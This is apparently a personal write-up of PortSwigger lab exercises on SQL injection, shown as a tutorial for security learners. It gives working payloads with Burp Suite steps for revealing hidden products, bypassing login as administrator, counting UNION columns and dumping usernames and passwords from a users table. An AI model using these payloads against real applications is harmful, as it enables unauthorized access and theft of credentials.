---
title: "SQL Injection (SQLi)"
date: 2026-04-19T22:54:34-04:00
draft: false
# Layout settings
showTableOfContents: true
# Project metadata
category: "Lab" # Web, Pwn, Crypto, Research
difficulty: "Medium"
tools: ["burp"]
# Featured image (drop feature.jpg in the folder)
feature: "feature.jpg"
---

## **Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data**
### Description

 This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:
 
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```


To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.
### Solution
**The Mechanism** 

When filtering by category, the application uses the following backend query, where `released = 1` hides unreleased products from regular users: `SELECT * FROM products WHERE category = '[INPUT]' AND released = 1`

**The Payload** 

We need to inject a logical statement that is always true and comment out the rest of the original query to bypass the `released = 1` restriction.

- **Raw Payload:** `' OR 1=1--`
- **Resulting Query:** `SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`
- **Breakdown:**
    - `'` closes the string literal for the category parameter.
    - `OR 1=1` is a statement that always evaluates to true, causing the database to return all items regardless of category.
    - `--` is the SQL comment indicator, telling the database to ignore the `AND released = 1` condition.

**Execution Steps**
1. Turn on **Burp Suite Proxy Intercept**.
2. Click on any category on the homepage (e.g., Accessories) to capture the `GET /filter?category=Accessories` request.![](Pasted%20image%2020260420001356.png)
3. Send the intercepted request to **Repeater (Ctrl+R)** for safe testing.
4. Modify the `category` parameter in the request line, ensuring the spaces are URL-encoded (using `+` or `%20`).
    - _Modified request line:_ `GET /filter?category=Accessories'+OR+1=1-- HTTP/1.1`
5. Click **Send**. Look at the Response panel—we should see a `200 OK` status, and rendering the HTML will reveal previously hidden unreleased products.
6. To officially solve the lab, either forward the modified request via the **Proxy** tab or paste the URL-encoded payload directly into your browser's address bar: `https://YOUR-LAB-ID.web-security-academy.net/filter?category=Accessories'+OR+1=1--`![](Pasted%20image%2020260420002942.png)

## **Lab: SQL injection vulnerability allowing login bypass**
### Description 
This lab contains a SQL injection vulnerability in the login function.

To solve the lab, perform a SQL injection attack that logs in to the application as the `administrator` user.

### Solution
**The Mechanism** 

The application uses the following backend query to validate user credentials: `SELECT * FROM users WHERE username = '[INPUT]' AND password = '[INPUT]'`

**The Payload** 

We can bypass the password check entirely by passing a valid username, closing the string, and using a SQL comment to drop the remainder of the query.

- **Payload:** `administrator'--`
- **Resulting Query:** `SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`
- **Breakdown:**
    - `administrator` targets the specific, highly privileged user account.
    - `'` closes the username string literal.
    - `--` comments out the rest of the query (specifically the `AND password =` check), making the password field completely irrelevant.
**Execution Steps**

1. Turn on **Burp Suite Proxy Intercept**.
2. Navigate to the Login page, type in any dummy credentials, click "Log in", and capture the `POST /login` request.
    ![](Pasted%20image%2020260420221800.png)
3. Send the request to **Repeater (Ctrl+R)**.
4. Modify the `username` parameter to include the payload:
    - _Modified parameter:_ `username=administrator'--`
    - _(Note: The `password` and `csrf` parameters can be left as-is, as the comment drops the password check anyway)._
5. Click **Send**. We should receive a `302 Found` redirect, indicating a successful login bypass.
6. To officially solve the lab, forward the modified request from your **Proxy** tab to the browser.

Once the page loads with the injected payload, the "Congratulations, you solved the lab!" banner will appear. 
![](Pasted%20image%2020260420222704.png)


## **Lab: SQL injection UNION attack, determining the number of columns returned by the query**

### Description 
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so we can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. We will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.

### Solution 
**The Mechanism** 

The application filters products using a query similar to: `SELECT * FROM products WHERE category = '[INPUT]'`

By injecting a `UNION SELECT` statement, we can force the database to append the results of your injected query to the original results. However, a `UNION` operation has a strict rule: **both queries must return the exact same number of columns**.

- If your injected query asks for a different number of columns than the original query, the database will throw an error (resulting in an HTTP 500 Internal Server Error).
    
- By incrementally adding columns to your injected query until the error disappears, we can deduce the exact column count.
    

**The Payloads** We use `NULL` values because they are compatible with any data type. If we guessed text or integers, the query might still fail due to data type mismatches.

- **Test 1 Column:** `' UNION SELECT NULL--`
    
- **Test 2 Columns:** `' UNION SELECT NULL, NULL--`
    
- **Test 3 Columns:** `' UNION SELECT NULL, NULL, NULL--`
    

**Execution Steps**

1. Turn on **Burp Suite Proxy Intercept**.
    
2. Click on any category filter on the homepage (e.g., Corporate Gifts) to capture the `GET /filter?category=Corporate+gifts request.
    ![](Pasted%20image%2020260420225857.png)
3. Send the intercepted request to **Repeater (Ctrl+R)**.
    
4. Modify the `category` parameter to test for one column. Ensure we URL-encode the spaces (using `+` or `%20`).
    
    - _Modified parameter:_ `category=Coporate+gifts'+UNION+SELECT+NULL--`
        
5. Click **Send**. Look at the Response panel. We will likely see a `500 Internal Server Error`, meaning the column count is incorrect.
    
6. Add another `NULL` to the payload and send it again:
    
    - _Modified parameter:_ `category=Gifts'+UNION+SELECT+NULL,NULL--`
        
    - Observe the `500 Internal Server Error`.
        
7. Add a third `NULL` to the payload and send it again:
    
    - _Modified parameter:_ `category=Gifts'+UNION+SELECT+NULL,NULL,NULL--`![](Pasted%20image%2020260420230048.png)
        
8. Observe the Response panel. We should now receive a `200 OK` status. This confirms the original query returns exactly 3 columns.
    
9. To officially solve the lab, either forward this successful request from your **Proxy** tab.
![](Pasted%20image%2020260420230227.png)

## **Lab: SQL injection UNION attack, finding a column containing text**

### Description
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so we can use a UNION attack to retrieve data from other tables. To construct such an attack, we first need to determine the number of columns returned by the query. We can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

### Solution
**The Mechanism** 

Once we know the number of columns returned by the original query (in this case, 3 columns), we must determine their data types. A `UNION` query will only execute successfully if the data types of the injected columns match the data types of the original columns.

If we try to inject text into a column that expects an integer, the database will throw an error. To find the text column, we must systematically replace the `NULL` values in your payload with the target text string, one column at a time, until the query executes successfully.

**The Payload** 

The lab will generate a random, unique string that we must retrieve (for this example, we will use the given string: `'ddWY5L'`). We will test the columns sequentially.

- **Test Column 1:** `' UNION SELECT 'ddWY5L', NULL, NULL--` (Assume this fails)
    
- **Test Column 2 (Successful Payload):** `' UNION SELECT NULL, 'ddWY5L', NULL--`
    
- **Resulting Query:** `SELECT * FROM products WHERE category = 'Accessories' UNION SELECT NULL, 'ddWY5L', NULL--'`
    
- **Breakdown:**
    
    - `'` closes the initial string literal for the category.
        
    - `UNION SELECT` appends our malicious query.
        
    - `NULL, 'ddWY5L', NULL` tests if the _second_ column can accept text data while keeping the other columns neutral.
        
    - `--` comments out the remainder of the original query.
        

**Execution Steps**

1. Turn on **Burp Suite Proxy Intercept**.
    
2. Click on any category on the homepage to capture the `GET /filter?category=Accessories request.
    
3. Send the intercepted request to **Repeater (Ctrl+R)**.
    
4. Check the lab instructions to find the specific random string we need to echo back (e.g., `AWN3ON`).
    
5. Test the first column by placing the string in the first position (remembering to URL-encode spaces):
    
    - _Modified parameter:_ `category=Gifts'+UNION+SELECT+'ddWY5L',NULL,NULL--`
        
    - Click **Send**. If we receive a `500 Internal Server Error`, this column does not accept text.
        
6. Test the second column by moving the string to the second position:
    
    - _Modified parameter:_ `category=Accessories'+UNION+SELECT+NULL,'ddWY5L',NULL--`
		![](Pasted%20image%2020260420234509.png)
        
1. Click **Send**. Look at the Response panel. If we receive a `200 OK` status and can see your string rendered in the HTML response, we have successfully found the text column.
    
2. To officially solve the lab, forward this successful request from your **Proxy** tab or paste the final URL-encoded payload directly into your browser's address bar.
![](Pasted%20image%2020260420234600.png)

## **Lab: SQL injection UNION attack, retrieving data from other tables**

### Description
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

### Solution
**The Mechanism** 

Once we have determined how many columns the original query returns and which of those columns accept text (in this specific lab, it is **two columns, both accepting text**), we can leverage a `UNION SELECT` to pull data from entirely different tables in the database.

By querying the `users` table and asking for the `username` and `password` columns, the database will append those credentials directly into the product listing on the webpage.

**The Payload** 

We will replace the `NULL` values or test strings from our previous reconnaissance with the actual column names we want to extract from the `users` table.

- **Payload:** `' UNION SELECT username, password FROM users--`
    
- **Resulting Query:** `SELECT * FROM products WHERE category = 'Gifts' UNION SELECT username, password FROM users--'`
    
- **Breakdown:**
    
    - `'` closes the initial string literal for the category filter.
        
    - `UNION SELECT username, password` instructs the database to fetch these specific columns. Since there are exactly two columns requested, they map perfectly to the original query's two-column output.
        
    - `FROM users` specifies the hidden table we are targeting.
        
    - `--` comments out the remainder of the original query.
        

**Execution Steps**

1. Turn on **Burp Suite Proxy Intercept**.
    
2. Click on any category on the homepage to capture the `GET /filter?category=Gifts` request.
	    ![](Pasted%20image%2020260420235449.png)
3. Send the intercepted request to **Repeater (Ctrl+R)**.
    
4. Modify the `category` parameter with your payload, ensuring all spaces are URL-encoded:
    
    - _Modified parameter:_ `category=Gifts'+UNION+SELECT+username,password+FROM+users--`
        ![](Pasted%20image%2020260420235356.png)
1. Click **Send**.
    
2. Look at the Response panel and scroll through the rendered HTML (or use the search bar at the bottom for "administrator"). We will see the usernames and their corresponding plaintext passwords listed as if they were product names and descriptions.
    
3. Copy the password associated with the `administrator` account.
    ![](Pasted%20image%2020260420235551.png)
4. To officially solve the lab, navigate to the **"My account"** login page in your browser. Log in using `administrator` and the password we just extracted.

![](Pasted%20image%2020260420235607.png)




**The Mechanism** 

In previous labs, we had multiple text-compatible columns to work with, allowing we to map `username` to one column and `password` to another. However, if the original query only returns _one_ column that accepts text, a `UNION SELECT username, password` will fail due to column count or data type mismatches.

To extract two pieces of data through a single text column, we must combine them into one string using a SQL concatenation operator. 

**The Payload** Assuming we have already tested the endpoint and found that the query returns two columns, but only the _second_ column accepts text data.

- **Payload:** `' UNION SELECT NULL, username || '~' || password FROM users--`
    
- **Resulting Query:** `SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL, username || '~' || password FROM users--'`
    
- **Breakdown:**
    
    - `'` closes the initial string literal for the category filter.
        
    - `UNION SELECT NULL,` keeps the first column neutral to match the original query's column count and avoid data type errors.
        
    - `username || '~' || password` commands the database to fetch the username, append a literal `~` character, and then append the password, returning it all as one single text block (e.g., `administrator~secret123`).
        
    - `FROM users` specifies the hidden table we are targeting.
        
    - `--` comments out the remainder of the original query.
        

**Execution Steps**

1. Turn on **Burp Suite Proxy Intercept**.
    
2. Click on any category on the homepage to capture the `GET /filter?category=Gifts` request.
    
3. Send the intercepted request to **Repeater (Ctrl+R)**.
    
4. Modify the `category` parameter with your concatenated payload. Remember to URL-encode the payload, paying special attention to spaces and the concatenation characters:
    
    - _Modified parameter:_ `category=Gifts'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`
        ![](Pasted%20image%2020260421000734.png)
1. Click **Send**.
    
2. Look at the Response panel and search the HTML for `administrator`. We should see the username and password rendered as a single string on the page, separated by our chosen character 
	![](Pasted%20image%2020260421000758.png)
    
3. Copy the password portion of the string.
    
4. To officially solve the lab, navigate to the **"My account"** login page in your browser. Log in using `administrator` and the extracted password.
![](Pasted%20image%2020260421000847.png)
